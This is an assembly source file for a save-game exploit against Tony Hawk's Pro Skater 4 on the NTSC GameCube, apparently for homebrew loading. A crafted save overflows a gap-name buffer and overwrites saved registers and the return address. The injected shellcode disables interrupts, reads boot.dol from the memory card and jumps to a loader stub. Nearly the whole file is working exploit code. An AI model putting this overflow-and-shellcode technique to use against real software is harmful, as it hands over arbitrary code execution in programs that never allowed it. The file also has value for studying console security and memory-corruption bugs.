# Description: Save game exploit for Tony Hawk's Pro Skater 4 for Gamecube (NTSC)
# Author: Grimdoomer

.set GapDataStartFileOffset,            0x3402
.set SaveBufferMemoryAddress,           0x809A34AC      # Points to start of save file in memory (accounts for 64 byte header in .gci file)

# Game function and data addresses:
.set __OSStopAudioSystem,               0x8016B9DC
.set CARDOpen,                          0x80185A2C
.set CARDRead,                          0x801863C8
.set CARDClose,                         0x80185BA4

.set FlushICache,                       0x8016BB90
.set FlushDCache,                       0x8016BAF8
.set memcpy,                            0x80178A1C

# Macro for calling an arbitrary address:
.macro FUNC_CALL addr
        lis     %r11, ((\addr >> 16) & 0xFFFF)
        ori     %r11, %r11, (\addr & 0xFFFF)
        mtctr   %r11
        bctrl
.endm

#---------------------------------------------------------
# Gap name buffer overflow
#---------------------------------------------------------
.long   GapDataStartFileOffset
.long   (_gap_data_end - _gap_data_start)

_gap_data_start:

        # +0 Start of gap 1 struct.
        .byte   0x08, 0x08, 0x11, 0x13
        .byte   0x00, 0x00, 0x13, 0x03

        # +8 Fill the gap name buffer with crap data.
        .byte   "Grim %r0x T0ny H4wk's S0x!"
_1:     .fill   0x38 - (_1 - _gap_data_start), 1, 0x69

        # +56 new register values for function prologue
        .long   0x15151515  # %r15
        .long   0x16161616  # %r16
        .long   0x17171717  # %r17
        .long   0x18181818  # %r18
        .long   0x19191919  # %r19
        .long   0x20202020  # %r20
        .long   0x21212121  # %r21
        .long   0x22222222  # %r22
        .long   0x23232323  # %r23
        .long   0x24242424  # %r24
        .long   0x25252525  # %r25
        .long   0x26262626  # %r26
        .long   0x27272727  # %r27
        .long   0x28282828  # %r28
        .long   0x29292929  # %r29
        .long   0x30303030  # %r30
        .long   0x31313131  # %r31
        .long   0xFFFFFFFF
        .long   SaveBufferMemoryAddress + GapDataStartFileOffset + (_gap_data_end - _gap_data_start)    # lr
        .long   0x00000000              #
        
        # Align shell code to 4-byte boundary based on memory address of save data.
        .byte   0x00, 0x00
        
_gap_data_end:

#---------------------------------------------------------
# Alignment patch
#---------------------------------------------------------
.long   0x8030
.long   (_alignment_end - _alignment_start)

_alignment_start:

        # We have to align the instruction address of the assembler to a 4 byte boundary without affecting the
        # offset of the shell code data so we use this useless patch at the end of the file.
        .align 4
        
_alignment_end:

#---------------------------------------------------------
# Main exploit shell code
#---------------------------------------------------------
.long   GapDataStartFileOffset + (_gap_data_end - _gap_data_start)
.long   (_shell_code_end - _shell_code_start)

_shell_code_start:

        .set StackSize,         0x20
        .set CardInfo,          -0x14
        
        # Setup stack frame.
        addi    %r1, %r1, -StackSize

        # Disable interrupts.
        mfmsr   %r3
        rlwinm  %r3,%r3,0,17,15
        mtmsr   %r3
        isync
        
        # Prevent beeping.
        FUNC_CALL   __OSStopAudioSystem
        
        # TODO: end whatever frame we're on, is this %really needed?
        
        # Change the game ID for boot.dol to DOLX00.
        lis     %r9, 0x8000
        lis     %r10, 0x444F
        ori     %r10, %r10, 0x4C58
        stw     %r10, 0(%r9)            # *(volatile u32*)0x80000000 = 0x444F4C58;
        li      %r10, 0x3030
        sth     %r10, 4(%r9)            # *(volatile u16*)0x80000004 = 0x3030;
        
        lis     %r3, 0x8000
        li      %r4, 6
        FUNC_CALL   FlushICache
        lis     %r3, 0x8000
        li      %r4, 6
        FUNC_CALL   FlushDCache
        
        # I don't think the game ever unmounts the memory card?
        
        # Open the boot.dol file.
        addi    %r5, %r1, StackSize+CardInfo
        lis     %r4, ((Hack_MemCardBootFile >> 16) & 0xFFFF)
        ori     %r4, %r4, (Hack_MemCardBootFile & 0xFFFF)
        li      %r3, 0
        FUNC_CALL   CARDOpen
        
        lis     %r29, 0x8000
        ori     %r29, %r29, 0x1800
        li      %r30, 0                 # currOffset = 0
        
_copy_loop:

        # %read next block of data from the memory card.
        mr      %r6, %r30                           # currOffset
        li      %r5, 0x200                          # 0x200
        mr      %r4, %r29                           # 0x80001800
        addi    %r3, %r1, StackSize+CardInfo        # &CardInfo
        FUNC_CALL   CARDRead
        cmplwi  %r3, 0
        bne     _copy_done
        
        # Flush cache.
        li      %r4, 0x200
        mr      %r3, %r29                           # 0x80001800
        FUNC_CALL   FlushICache
        li      %r4, 0x200
        mr      %r3, %r29                           # 0x80001800
        FUNC_CALL   FlushDCache
        
        #
        li      %r6, 0x200
        mr      %r5, %r30
        li      %r4, 0x1800
        li      %r3, 0
        bl      _Hack_ar_dma
        
        # Next block.
        addi    %r30, %r30, 0x200
        b       _copy_loop
        
_copy_done:

        # Close the file handle.
        addi    %r3, %r1, StackSize+CardInfo        # &CardInfo
        FUNC_CALL   CARDClose
        
        # Unmount the card? I don't think the game ever does this...
        
        # Copy the loader stub into memory.
        li      %r5, Hack_LoaderStubSize
        lis     %r4, ((Hack_LoaderStub >> 16) & 0xFFFF)
        ori     %r4, %r4, (Hack_LoaderStub & 0xFFFF)
        mr      %r3, %r29
        FUNC_CALL   memcpy
        
        li      %r4, Hack_LoaderStubSize
        mr      %r3, %r29
        FUNC_CALL   FlushICache
        li      %r4, Hack_LoaderStubSize
        mr      %r3, %r29
        FUNC_CALL   FlushDCache
        
        # Jump to the loader stub.
        mtlr    %r29
        blr

    #---------------------------------------------------------
    # void Hack_ar_dma(int type, int mram, int aram, int len)
    #---------------------------------------------------------
_Hack_ar_dma:

        srwi      %r10, %r4, 16
        lis       %r9, -0x3400
        ori       %r9, %r9, 0x5020 # 0xCC005020
        sth       %r10, 0(%r9)
        addi      %r9, %r9, 2
        sth       %r4, 0(%r9)
        srwi      %r10, %r5, 16
        addi      %r9, %r9, 2
        sth       %r10, 0(%r9)
        addi      %r9, %r9, 2
        sth       %r5, 0(%r9)
        slwi      %r3, %r3, 15
        srwi      %r9, %r6, 16
        or        %r3, %r3, %r9
        lis       %r9, -0x3400
        ori       %r9, %r9, 0x5028 # 0xCC005028
        sth       %r3, 0(%r9)
        addi      %r9, %r9, 2
        sth       %r6, 0(%r9)
        lis       %r10, -0x3400
        ori       %r10, %r10, 0x500A # 0xCC00500A

loc_7C:
        lhz       %r9, 0(%r10)
        andi.     %r9, %r9, 0x200
        bne       loc_7C

        blr

_Hack_MemCardBootFile:
        .ascii "boot.dol"
        .byte 0x00
        .align 4
        
_Hack_LoaderStub:

        # Include the stripped loader binary.
        .incbin "loader.bin"

_Hack_LoaderStubEnd:
        
_shell_code_end:

.set Hack_MemCardBootFile,              SaveBufferMemoryAddress + GapDataStartFileOffset + (_gap_data_end - _gap_data_start) + (_Hack_MemCardBootFile - _shell_code_start)
.set Hack_LoaderStub,                   SaveBufferMemoryAddress + GapDataStartFileOffset + (_gap_data_end - _gap_data_start) + (_Hack_LoaderStub - _shell_code_start)
.set Hack_LoaderStubSize,               (_Hack_LoaderStubEnd - _Hack_LoaderStub)

.long 0xFFFFFFFF


